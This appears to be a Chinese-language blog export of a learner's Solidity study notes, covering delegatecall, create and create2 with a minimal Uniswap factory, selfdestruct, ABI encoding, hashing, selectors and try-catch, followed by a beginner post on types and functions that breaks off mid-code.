Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合同的代理合同。\n\ndelegatecall例子调用结构：你（A）通过合约B调用目标合约C。\n被调用的合约C我们先写一个简单的目标合约C：有两个public变量：num和sender，分别是uint256和address类型；有一个函数，可以将num设定为传入的_num，并且将sender设为msg.sender。\n// 被调用的合约C\ncontract C {\n    uint public num;\n    address public sender;\n\n    function setVars(uint _num) public payable {\n        num = _num;\n        sender = msg.sender;\n    }\n}\n发起调用的合约B首先，合约B和目标合约C的变量存储布局必须相同，两个变量，并且顺序为num和sender\ncontract B {\n    uint public num;\n    address public sender;\n接下来，我们分别用call和delegatecall来调用合约C的setVars函数，更好的理解它们的区别。\ncallSetVars函数通过call来调用setVars。它有两个参数_addr和_num，分别对应合约C的地址和setVars的参数。\n// 通过call来调用C的setVars()函数，将改变合约C里的状态变量\nfunction callSetVars(address _addr, uint _num) external payable{\n    // call setVars()\n    (bool success, bytes memory data) = _addr.call(\n        abi.encodeWithSignature(\"setVars(uint256)\", _num)\n    );\n}\n而delegatecallSetVars函数通过delegatecall来调用setVars。与上面的callSetVars函数相同，有两个参数_addr和_num，分别对应合约C的地址和setVars的参数。\n    // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量\n    function delegatecallSetVars(address _addr, uint _num) external payable{\n        // delegatecall setVars()\n        (bool success, bytes memory data) = _addr.delegatecall(\n            abi.encodeWithSignature(\"setVars(uint256)\", _num)\n        );\n    }\n}\n在remix上验证1.首先，我们把合约B和C都部署好\n\n2.部署之后，查看C合约状态变量的初始值，B合约的状态变量也是一样。\n\n3.此时，调用合约B中的callSetVars，传入参数为合约C地址和10\n\n4.运行后，合约C中的状态变量将被修改：num被改为10，sender变为合约B的地址\n\n5.接下来，我们调用合约B中的delegatecallSetVars，传入参数为合约C地址和100\n\n6.由于是delegatecall，语境为合约B。在运行后，合约B中的状态变量将被修改：num被改为100，sender变为你的钱包地址。合约C中的状态变量不会被修改。\n\n24.在合约中创建新合约在以太坊链上，用户（外部账户，EOA）可以创建智能合约，智能合约同样也可以创建新的智能合约。去中心化交易所uniswap就是利用工厂合约（Factory）创建了无数个币对合约（Pair）。这一讲，我会用简化版的uniswap讲如何通过合约创建合约。\ncreate和create2有两种方法可以在合约中创建新合约，create和create2，这里我们讲create，下一讲会介绍create2。\ncreate的用法很简单，就是new一个合约，并传入新合约构造函数所需的参数：\nContract x = new Contract{value: _value}(params)\n其中Contract是要创建的合约名，x是合约对象（地址），如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数。\n极简UniswapUniswap V2核心合约中包含两个合约：\n\nUniswapV2Pair: 币对合约，用于管理币对地址、流动性、买卖。\nUniswapV2Factory: 工厂合约，用于创建新的币对，并管理币对地址。\n\n下面我们用create方法实现一个极简版的Uniswap：Pair币对合约负责管理币对地址，PairFactory工厂合约用于创建新的币对，并管理币对地址。\nPair合约contract Pair{\n    address public factory; // 工厂合约地址\n    address public token0; // 代币1\n    address public token1; // 代币2\n\n    constructor() payable {\n        factory = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external {\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    }\n}\nPair合约很简单，包含3个状态变量：factory，token0和token1。\n构造函数constructor在部署时将factory赋值为工厂合约地址。initialize函数会在Pair合约创建的时候被工厂合约调用一次，将token0和token1更新为币对中两种代币的地址。\n\n\n\n\n\n\n\n\n\n提问：为什么uniswap不在constructor中将token0和token1地址更新好？\n答：因为uniswap使用的是create2创建合约，限制构造函数不能有参数。当使用create时，Pair合约允许构造函数有参数，可以在constructor中将token0和token1地址更新好。\nPairFactorycontract PairFactory{\n    mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址\n    address[] public allPairs; // 保存所有Pair地址\n\n    function createPair(address tokenA, address tokenB) external returns (address pairAddr) {\n        // 创建新合约\n        Pair pair = new Pair(); \n        // 调用新合约的initialize方法\n        pair.initialize(tokenA, tokenB);\n        // 更新地址map\n        pairAddr = address(pair);\n        allPairs.push(pairAddr);\n        getPair[tokenA][tokenB] = pairAddr;\n        getPair[tokenB][tokenA] = pairAddr;\n    }\n}\n工厂合约（PairFactory）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有代币地址。\nPairFactory合约只有一个createPair函数，根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中\nPair pair = new Pair(); \n就是创建合约的代码，非常简单。大家可以部署好PairFactory合约，然后用下面两个地址作为参数调用createPair，看看创建的币对地址是什么：\nWBNB地址: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78\nBSC链上的PEOPLE地址:\n0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\n在remix上验证1.使用WBNB和PEOPLE的地址作为参数调用createPair,得到Pair合约地址：0xD3e2008b4Da2cD6DEAF73471590fF30C86778A48\n\n（刚开始没整出来，加个步骤，复制得到的Pair合约地址，放到At Address里面，同时上面部署合约要改回Pair,点击At Address得到合约）\n\n2.查看Pair合约变量\n\n3.Debug查看create操作码\n\n25.Create2CREATE2 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。Uniswap创建Pair合约用的就是CREATE2而不是CREATE。\nCreate如何计算地址智能合约可以由其他合约和普通账户利用CREATE操作码创建。 在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和nonce(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。\n新地址 = hash(创建者地址, nonce)\n创建者地址不会变，但nonce可能会随时间而改变，因此用CREATE创建的合约地址不好预测。\nCreate2如何计算地址CREATE2的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用CREATE2创建的合约地址由4个部分决定：\n\n0xFF：一个常数，避免和CREATE冲突\n创建者地址\nsalt（盐）：一个创建者给定的数值\n待部署合约的字节码（bytecode）\n\n新地址 = hash(\"0xFF\",创建者地址, salt, bytecode)\nCREATE2 确保，如果创建者使用 CREATE2 和提供的 salt 部署给定的合约bytecode，它将存储在 新地址 中。\n如何使用Create2CREATE2的用法和之前讲的Create类似，同样是new一个合约，并传入新合约构造函数所需的参数，只不过要多传一个salt参数：\nContract x = new Contract{salt: _salt, value: _value}(params)\n其中Contract是要创建的合约名，x是合约对象（地址），_salt是指定的盐；如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数。\n极简Uniswap2Paircontract Pair{\n    address public factory; // 工厂合约地址\n    address public token0; // 代币1\n    address public token1; // 代币2\n\n    constructor() payable {\n        factory = msg.sender;\n    }\n\n    // called once by the factory at time of deployment\n    function initialize(address _token0, address _token1) external {\n        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    }\n}\nPair合约很简单，包含3个状态变量：factory，token0和token1。\n构造函数constructor在部署时将factory赋值为工厂合约地址。initialize函数会在Pair合约创建的时候被工厂合约调用一次，将token0和token1更新为币对中两种代币的地址。\nPairFactory2contract PairFactory2{\n        mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址\n        address[] public allPairs; // 保存所有Pair地址\n\n        function createPair2(address tokenA, address tokenB) external returns (address pairAddr) {\n            require(tokenA != tokenB, 'IDENTICAL_ADDRESSES'); //避免tokenA和tokenB相同产生的冲突\n            // 计算用tokenA和tokenB地址计算salt\n            (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序\n            bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n            // 用create2部署新合约\n            Pair pair = new Pair{salt: salt}(); \n            // 调用新合约的initialize方法\n            pair.initialize(tokenA, tokenB);\n            // 更新地址map\n            pairAddr = address(pair);\n            allPairs.push(pairAddr);\n            getPair[tokenA][tokenB] = pairAddr;\n            getPair[tokenB][tokenA] = pairAddr;\n        }\n    }\n工厂合约（PairFactory2）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有币对地址。\nPairFactory2合约只有一个createPair2函数，使用CREATE2根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中\nPair pair = new Pair{salt: salt}(); \n就是利用CREATE2创建合约的代码，非常简单，而salt为token1和token2的hash：\nbytes32 salt = keccak256(abi.encodePacked(token0, token1));\n事先计算Pair地址// 提前计算pair合约地址\nfunction calculateAddr(address tokenA, address tokenB) public view returns(address predictedAddress){\n    require(tokenA != tokenB, 'IDENTICAL_ADDRESSES'); //避免tokenA和tokenB相同产生的冲突\n    // 计算用tokenA和tokenB地址计算salt\n    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序\n    bytes32 salt = keccak256(abi.encodePacked(token0, token1));\n    // 计算合约地址方法 hash()\n    predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(\n        bytes1(0xff),\n        address(this),\n        salt,\n        keccak256(type(Pair).creationCode)\n    )))));\n}\n我们写了一个calculateAddr函数来事先计算tokenA和tokenB将会生成的Pair地址。通过它，我们可以验证我们事先计算的地址和实际地址是否相同。\n大家可以部署好PairFactory2合约，然后用下面两个地址作为参数调用createPair2，看看创建的币对地址是什么，是否与事先计算的地址一样：\nWBNB地址: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78\nBSC链上的PEOPLE地址:\n0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\n在remix上验证\n首先用WBNB和PEOPLE的地址哈希作为salt来计算出Pair合约的地址\n\n调用PairFactory2.createPair2传入参数为WBNB和PEOPLE的地址，获取出创建的pair合约地址\n\n对比合约地址 \n\n\n\ncreate2的实际应用场景\n交易所为新用户预留创建钱包合约地址。\n由 CREATE2 驱动的 factory 合约，在uniswapV2中交易对的创建是在 Factory中调用create2完成。这样做的好处是: 它可以得到一个确定的pair地址, 使得 Router中就可以通过 (tokenA, tokenB) 计算出pair地址, 不再需要执行一次 Factory.getPair(tokenA, tokenB) 的跨合约调用。\n\n26.删除合约selfdestructselfdestruct命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。selfdestruct是为了应对合约出错的极端情况而设计的。它最早被命名为suicide（自杀），但是这个词太敏感。为了保护抑郁的程序员，改名为selfdestruct。\n如何使用selfdestructselfdestruct使用起来非常简单：\nselfdestruct(_addr)；\n其中_addr是接收合约中剩余ETH的地址。\n例子contract DeleteContract {\n\n    uint public value = 10;\n\n    constructor() payable {}\n\n    receive() external payable {}\n\n    function deleteContract() external {\n        // 调用selfdestruct销毁合约，并把剩余的ETH转给msg.sender\n        selfdestruct(payable(msg.sender));\n    }\n\n    function getBalance() external view returns(uint balance){\n        balance = address(this).balance;\n    }\n}\n在DeleteContract合约中，我们写了一个public状态变量value，两个函数：getBalance()用于获取合约ETH余额，deleteContract()用于自毁合约，并把ETH转入给发起人。\n部署好合约后，我们向DeleteContract合约转入1 ETH。这时，getBalance()会返回1 ETH，value变量是10。\n当我们调用deleteContract()函数，合约将自毁，所有变量都清空，此时value变为默认值0，getBalance()也返回空值。\n注意事项\n对外提供合约销毁接口时，最好设置为只有合约所有者可以调用，可以使用函数修饰符onlyOwner进行函数声明。\n当合约被销毁后与智能合约的交互也能成功，并且返回0。\n当合约中有selfdestruct功能时常常会带来安全问题和信任问题，合约中的Selfdestruct功能会为攻击者打开攻击向量(例如使用selfdestruct向一个合约频繁转入token进行攻击，这将大大节省了GAS的费用，虽然很少人这么做)，此外，此功能还会降低用户对合约的信心。\n\n27.ABI编码解码ABI (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。\nSolidity中，ABI编码有4个函数：abi.encode, abi.encodePacked, abi.encodeWithSignature, abi.encodeWithSelector。而ABI解码有1个函数：abi.decode，用于解码abi.encode的数据。\nABI编码我们将用编码4个变量，他们的类型分别是uint256, address, string, uint256[2]：\nuint x = 10;\naddress addr = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;\nstring name = \"0xAA\";\nuint[2] array = [5, 6]; \nabi.encode将给定参数利用ABI规则编码。ABI被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是abi.encode。\nfunction encode() public view returns(bytes memory result) {\n    result = abi.encode(x, addr, name, array);\n}\n编码的结果为0x000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000，由于abi.encode将每个数据都填充为32字节，中间有很多0。\nabi.encodePacked将给定参数根据其所需最低空间编码。它类似 abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据的hash时。\nfunction encodePacked() public view returns(bytes memory result) {\n    result = abi.encodePacked(x, addr, name, array);\n}\n编码的结果为0x000000000000000000000000000000000000000000000000000000000000000a7a58c0be72be218b41c608b7fe7c5bb630736c713078414100000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006，由于abi.encodePacked对编码进行了压缩，长度比abi.encode短很多。\nabi.encodeWithSignature与abi.encode功能类似，只不过第一个参数为函数签名，比如\"foo(uint256,address)\"。当调用其他合约的时候可以使用。\nfunction encodeWithSignature() public view returns(bytes memory result) {\n    result = abi.encodeWithSignature(\"foo(uint256,address,string,uint256[2])\", x, addr, name, array);\n}\n编码的结果为0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000，等同于在abi.encode编码结果前加上了4字节的函数选择器说明。 说明: 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用\nabi.encodeWithSelector与abi.encodeWithSignature功能类似，只不过第一个参数为函数选择器，为函数签名Keccak哈希的前4个字节。\nfunction encodeWithSelector() public view returns(bytes memory result) {\n    result = abi.encodeWithSelector(bytes4(keccak256(\"foo(uint256,address,string,uint256[2])\")), x, addr, name, array);\n}\n编码的结果为0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000，与abi.encodeWithSignature结果一样。\nABI解码abi.decodeabi.decode用于解码abi.encode生成的二进制编码，将它还原成原本的参数。\nfunction decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) {\n    (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));\n}\n我们将abi.encode的二进制编码输入给decode，将解码出原来的参数：\n\nABI的使用场景1.在合约开发中，ABI常配合call来实现对合约的底层调用。\nbytes4 selector = contract.getValue.selector;\n\nbytes memory data = abi.encodeWithSelector(selector, _x);\n(bool success, bytes memory returnedData) = address(contract).staticcall(data);\nrequire(success);\n\nreturn abi.decode(returnedData, (uint256));\n2.ethers.js中常用ABI实现合约的导入和函数调用。\nconst wavePortalContract = new ethers.Contract(contractAddress, contractABI, signer);\n/*\n    * Call the getAllWaves method from your Smart Contract\n    */\nconst waves = await wavePortalContract.getAllWaves();\n3.对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。\n\n0x533ba33a() 是一个反编译后显示的函数，只有函数编码后的结果，并且无法查到函数签名 \n\n\n这种情况无法通过构造interface接口或contract来进行调用 \n\n\n\n这种情况下，就可以通过ABI函数选择器来调用\nbytes memory data = abi.encodeWithSelector(bytes4(0x533ba33a));\n\n(bool success, bytes memory returnedData) = address(contract).staticcall(data);\nrequire(success);\n\nreturn abi.decode(returnedData, (uint256));\n28.Hash哈希函数（hash function）是一个密码学概念，它可以将任意长度的消息转换为一个固定长度的值，这个值也称作哈希（hash）。\nHash的性质一个好的哈希函数应该具有以下几个特性：\n\n单向性：从输入的消息到它的哈希的正向运算简单且唯一确定，而反过来非常难，只能靠暴力枚举。\n灵敏性：输入的消息改变一点对它的哈希改变很大。\n高效性：从输入的消息到哈希的运算高效。\n均一性：每个哈希值被取到的概率应该基本相等。\n抗碰撞性：\n弱抗碰撞性：给定一个消息x，找到另一个消息x'使得hash(x) = hash(x')是困难的。\n强抗碰撞性：找到任意x和x'，使得hash(x) = hash(x')是困难的。\n\n\n\nHash的应用\n生成数据唯一标识\n加密签名\n安全加密\n\nKeccak256Keccak256函数是solidity中最常用的哈希函数，用法非常简单：\n哈希 = keccak256(数据);\nKeccak256和sha3\nsha3由keccak标准化而来，在很多场合下Keccak和SHA3是同义词，但在2015年8月SHA3最终完成标准化时，NIST调整了填充算法。所以SHA3就和keccak计算的结果不一样，这点在实际开发中要注意。\n以太坊在开发的时候sha3还在标准化中，所以采用了keccak，所以Ethereum和Solidity智能合约代码中的SHA3是指Keccak256，而不是标准的NIST-SHA3，为了避免混淆，直接在合约代码中写成Keccak256是最清晰的。\n\n生成数据唯一标志我们可以利用keccak256来生成一些数据的唯一标识。比如我们有几个不同类型的数据：uint，string，address，我们可以先用abi.encodePacked方法将他们打包编码，然后再用keccak256来生成唯一标识：\nfunction hash(\n    uint _num,\n    string memory _string,\n    address _addr\n) public pure returns (bytes32) {\n    return keccak256(abi.encodePacked(_num, _string, _addr));\n}\n弱抗碰撞性我们用keccak256演示一下之前讲到的弱抗碰撞性，即给定一个消息x，找到另一个消息x'使得hash(x) = hash(x')是困难的。\n我们给定一个消息0xAA，试图去找另一个消息，使得它们的哈希值相等：\n// 弱抗碰撞性\nfunction weak(\n    string memory string1\n)public view returns (bool){\n    return keccak256(abi.encodePacked(string1)) == _msg;\n}\n（大家可以试个10次，看看能不能幸运的碰撞上。）\n强抗碰撞性我们用keccak256演示一下之前讲到的强抗碰撞性，即找到任意不同的x和x'，使得hash(x) = hash(x')是困难的。\n我们构造一个函数strong，接收两个不同的string参数string1和string2，然后判断它们的哈希是否相同：\n// 强抗碰撞性\nfunction strong(\n    string memory string1,\n    string memory string2\n)public pure returns (bool){\n    return keccak256(abi.encodePacked(string1)) == keccak256(abi.encodePacked(string2));\n}\n（大家可以试个10次，看看能不能幸运的碰撞上。）\n29.选择器selector当我们调用智能合约时，本质上是向目标合约发送了一段calldata，在remix中发送一次交易后，可以在详细信息中看见input即为此次交易的calldata\n\n发送的calldata中前4个字节是selector（函数选择器）。\nmsg.datamsg.data是solidity中的一个全局变量，值为完整的calldata（调用函数时传入的数据）。\n在下面的代码中，我们可以通过Log事件来输出调用mint函数的calldata：\n// event 返回msg.data\nevent Log(bytes data);\n\nfunction mint(address to) external{\n    emit Log(msg.data);\n}\n当参数为0x2c44b726ADF1963cA47Af88B284C06f30380fC78时，输出的calldata为\n0x6a6278420000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78\n这段很乱的字节码可以分成两部分：\n前4个字节为函数选择器selector：\n0x6a627842\n\n后面32个字节为输入的参数：\n0x0000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78\n其实calldata就是告诉智能合约，我要调用哪个函数，以及参数是什么。\nmethod id、selector和函数签名method id定义为函数签名的Keccak哈希后的前4个字节，当selector与method id相匹配时，即表示调用该函数，那么函数签名是什么？\n其实在第21讲中，我们简单介绍了函数签名，为\"函数名（逗号分隔的参数类型)\"。举个例子，上面代码中mint的函数签名为\"mint(address)\"。在同一个智能合约中，不同的函数有不同的函数签名，因此我们可以通过函数签名来确定要调用哪个函数。\n注意：在函数签名中，uint和int要写为uint256和int256。\n我们写一个函数，来验证mint函数的method id是否为0x6a627842。大家可以运行下面的函数，看看结果。\nfunction mintSelector() external pure returns(bytes4 mSelector){\n    return bytes4(keccak256(\"mint(address)\"));\n}\n结果正是0x6a627842：\n\n使用selector我们可以利用selector来调用目标函数。例如我想调用mint函数，我只需要利用abi.encodeWithSelector将mint函数的method id作为selector和参数打包编码，传给call函数：\nfunction callWithSignature() external returns(bool, bytes memory){\n    (bool success, bytes memory data) = address(this).call(abi.encodeWithSelector(0x6a627842, \"0x2c44b726ADF1963cA47Af88B284C06f30380fC78\"));\n    return(success, data);\n}\n在日志中，我们可以看到mint函数被成功调用，并输出Log事件。\n\n30.Try Catchtry-catch是现代编程语言几乎都有的处理异常的一种标准方式，solidity0.6版本也添加了它。\ntry-catch在solidity中，try-catch只能被用于external函数或创建合约时constructor（被视为external函数）的调用。基本语法如下：\ntry externalContract.f() {\n    // call成功的情况下 运行一些代码\n} catch {\n    // call失败的情况下 运行一些代码\n}\n其中externalContract.f()是某个外部合约的函数调用，try模块在调用成功的情况下运行，而catch模块则在调用失败时运行。\n同样可以使用this.f()来替代externalContract.f()，this.f()也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。\n如果调用的函数有返回值，那么必须在try之后声明returns(returnType val)，并且在try模块中可以使用返回的变量；如果是创建合约，那么返回值是新创建的合约变量。\ntry externalContract.f() returns(returnType val){\n    // call成功的情况下 运行一些代码\n} catch {\n    // call失败的情况下 运行一些代码\n}\n另外，catch模块支持捕获特殊的异常原因：\ntry externalContract.f() returns(returnType){\n    // call成功的情况下 运行一些代码\n} catch Error(string memory reason) {\n    // 捕获失败的 revert() 和 require()\n} catch (bytes memory reason) {\n    // 捕获失败的 assert()\n}\ntry-catch实战onlyEven我们创建一个外部合约OnlyEven，并使用try-catch来处理异常：\ncontract OnlyEven{\n    constructor(uint a){\n        require(a != 0, \"invalid number\");\n        assert(a != 1);\n    }\n\n    function onlyEven(uint256 b) external pure returns(bool success){\n        // 输入奇数时revert\n        require(b % 2 == 0, \"Ups! Reverting\");\n        success = true;\n    }\n}\nOnlyEven合约包含一个构造函数和一个onlyEven函数。\n\n构造函数有一个参数a，当a=0时，require会抛出异常；当a=1时，assert会抛出异常；其他情况均正常。\nonlyEven函数有一个参数b，当b为奇数时，require会抛出异常。\n\n处理外部函数调用异常首先，在TryCatch合约中定义一些事件和状态变量：\n// 成功event\nevent SuccessEvent();\n\n// 失败event\nevent CatchEvent(string message);\nevent CatchByte(bytes data);\n\n// 声明OnlyEven合约变量\nOnlyEven even;\n\nconstructor() {\n    even = new OnlyEven(2);\n}\nSuccessEvent是调用成功会释放的事件，而CatchEvent和CatchByte是抛出异常时会释放的事件，分别对应require/revert和assert异常的情况。even是个OnlyEven合约类型的状态变量。\n然后我们在execute函数中使用try-catch处理调用外部函数onlyEven中的异常：\n// 在external call中使用try-catch\nfunction execute(uint amount) external returns (bool success) {\n    try even.onlyEven(amount) returns(bool _success){\n        // call成功的情况下\n        emit SuccessEvent();\n        return _success;\n    } catch Error(string memory reason){\n        // call不成功的情况下\n        emit CatchEvent(reason);\n    }\n}\n","slug":"solidity进阶","date":"2022-12-07T15:23:57.000Z","categories_index":"","tags_index":"solidity","author_index":"cocoZ"},{"id":"3b889475d55359c53070293a35d903d7","title":"solidity入门","content":"solidity1.入门// SPDX-License-Identifier: MIT\t\t\t\t//这个代码所用的软件许可，如果不写许可，编译时会警告\npragma solidity ^0.8.4;\t\t\t\t//声明源文件所用的solidity版本\ncontract HelloWeb3{\t\t\t\t//创建合约（contract），并声明合约名字为Helloweb3\n    string public _string = \"Hello Web3!\";\t\t//合约的内容，声明了一个string（字符串）变量_string，并赋值\n}\n2.数值类型数值类型1.布尔型：二值变量，取值为 true或falsebool public  _bool = true;布尔值的运算符：！（逻辑非）、&amp;&amp;（逻辑与）、||（逻辑或）、==（等于）、！=（不等于）\n2.整型：\nint public _int = -1;\t\t\t//整数，包括负数\nuint public _uint = 1;\t\t\t//正整数\nuint256 public _number = 20220330;\t\t //256位正整数\nuint public _coco1 =2**4;\t\t//求指数2^4=16\nbool public _numberbool = _Uint &gt; _int;\t\t//比大小\n3.地址类型：存储一个20字节的值（以太坊地址的大小）。地址类型也由成员变量，并作为所有合约的基础。地址类型分为普通的地址和可以转账ETH的地址（payable）payable的地址拥有balance和transfer（）两个成员，方便查询ETH余额以及转账。\naddress public _address =0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;\naddress payable public _address1 = payable(_address);\t\t//payable address可以转账、查余额\nuint256 public balance = _address1.balance;  //address1的余额\n4.定长字节数组：字节数组bytes分为定长（byte,bytes8，bytes32）和不定长。（定长的属于数值类型，不定长的属于引用类型）定长byte可以存一些数据，消耗gas比较少\nbytes32 public _byte32 = \"Minisolidity\";\t\t//Minisolidity变量以字节的方式存储进变量_byte32，转换成16进制为：0x4d696e69536f6c69646974790000000000000000000000000000000000000000\nbytes1 public _byte = _byte32[0];\t\t//_byte变量存储_byte32的第一个字节，为0x4d\nTip：byte是bytes1的别名\n（Q:为啥每个元素会浪费31字节？)\n5.枚举enum枚举是solidity中用户定义的数据类型，主要为uint分配名称，使程序易于阅读和维护（参考c语言）\nenum ActionSet{Buy,hold,Sell}\t\t//用enum将unit 0， 1， 2表示为Buy, Hold, Sell\nActionSet action = ActionSet.Buy;\t//创建enum变量action\n（Q:这段话有点看不懂，啥叫显式的和uint相互转换？然后检查是怎么检查的？)\nemmmmm，懂了，我觉得就是数组名称和数组索引的转换，检查是自动会检查的，如果不在长度内会报错\n3.函数类型函数function &lt;function name&gt;(&lt;parameter types&gt;) {internal|external|public|private} [pure|view|payable] [returns (&lt;return types&gt;)]\nfunction 函数名(输入到函数的变量类型和名字) 函数可见性说明符 决定函数权限/功能的关键字 returns(函数返回的变量类型和名称)\n1.function：声明函数的关键字2.&lt;function name&gt;：函数名3.(&lt;parameter types&gt;)：函数的参数，变量类型+变量名4.{internal|external|public|private}：函数可见性说明符，一共4种（没标明函数类型的，默认internal）\n\npublic：内部外部都可见（也可以用于修饰状态变量，public变量会自动生成getter函数，用于查询数据）\nprivate：只能从合约内部访问，继承的合约也不能用（也可用于修饰状态变量）\nexternal：只能从合约外部访问（但是可以用this.f()来调用，f是函数名）\ninternal：只能从合约内部访问，继承的合约可以用（也可以用于修饰状态变量）5.[pure|view|payable]：决定函数权限/功能的关键字。（payable运行时可以给合约转入ETH）6.[returns()]：函数返回的变量类型和名称 \n\n\neg: function getData() external view returns(uint256) {\n         return data;\n     } \n关于pure和view在合约里面定义一个状态变量number=5\n// SPDX-License-Indentifier:MIT\npragma solidity ^0.8.4;\ncontract FunctionTypes{\nuint256 public number=5;\n定义一个add()函数，每次调用，每次给number+1\n//默认\nfunction add() external{\nnumber=number+1;\n}\n如果add()包含了pure关键字，例如function add() pure external，就会报错。pure没有权限读取合约的相关变量，更没有权限改写。pure函数能干啥捏？(pure：纯纯牛马emmmmm)eg：可以给函数传递一个参数_number，然后让他返回_number+1\nfunction addPure(uint256 _number) external pure returns(uint256 new_number){\nnew_number=_number+1;\n}\n\n如图，在_number位置传入一个参数7，就会执行函数，得到输出结果为8\n如果add()包含view，比如function add() view external也会报错。因为view能读取，但是不能够改写状态变量。可以稍微改一下，让其不改写number，而是返回一个新的变量。(view：看客)\nuint public number=1;\nfunction addView() external view returns(uint256 new_number){\nnew_number=number+1;\n}\n\n点击addView这个函数就会直接读取number=5，直接输出number3=6\n（Q:遇到一个问题，就是这样子写报错了，addView函数里面写uint256 number=5也会报错，我觉得是因为view只有读取的权限没有写入的权限，是嘛是嘛？？？）\n\n\n为什么引入pure和view关键字solidity引入pure和view关键字主要是为了节省gas和控制函数权限：如果用户直接调用pure/view方程是不消耗gas的（合约中非pure/gas函数调用它们则会改写链上状态，需要付gas）\n关于internal和external（Q：我自己问出了一个很蠢的问题：怎么区分合约内部和外部）我思考了一下，还是要回到1入门那边，最开始学习到的创建一个合约\n\n所以我知道怎么区分了（所以我是pure，纯纯牛马一个\n//internal:内部\nfunction minus() internal{\nnumber=number-1;\n}\n//合约内的函数可以调用内部函数\nfunction minusCall() external(){\nminus();\n}\n定义一个internal的minus()函数，每次调用使number-1。由于是internal，只能从合约内部调用，不能从外部。因此，还要再定义一个external的minusCall()函数，来直接调用内部的minus()\n\n图片里面只能看到minus222（）看不到minus（）这样子\n（Tip：我的理解是internal有像把函数写进合约内部，然后external是写在外部，直接调用即可。)（这样子理解有问题否？？？？？\npayable//payable：递钱，能给合约支付ETH的函数\nfunction minusPayable() external payable returns(uint256 balance){\nminus();\nbalance=address(this).balance;\n}\n定义一个external payable的minusPayable()函数，间接的调用minus()，并且返回合约里的ETH余额（this关键字可以让我们引用合约地址）我们可以再调用minusPayable()时，往合约里转入1个ETH\n\n是这样的，可以在左下角看到余额balance：1ETH\n\n4.函数输出return返回值return和returnsreturn和returns这两个关键字与函数输出相关。区别在于：\n\nreturns加在函数名后面，用于声明返回的变量类型及变量名；\nreturns用于函数主体中，返回指定的变量。\n\n//返回多个变量\nfunction returnMultiple() public pure returns(uint256,bool,uint256[3] memory){\nreturn(1,true,[uint256(1),2,5]);\n}\n声明了returnMultiple()函数将有多个输出：returns(uint256,bool,uint256[3] memory)，接着在函数的主体中用return(1,true,[uint256(1),2,5])确定了返回值\n命名式返回我们可以在returns中 标明返回变量的名称，这样solidity会自动给这些变量初始化，并且自动返回这些函数的值，不需要加return\n// 返回多个变量\nfunction returnMultiple() public pure returns(uint256, bool, uint256[3] memory){\n        return(1, true, 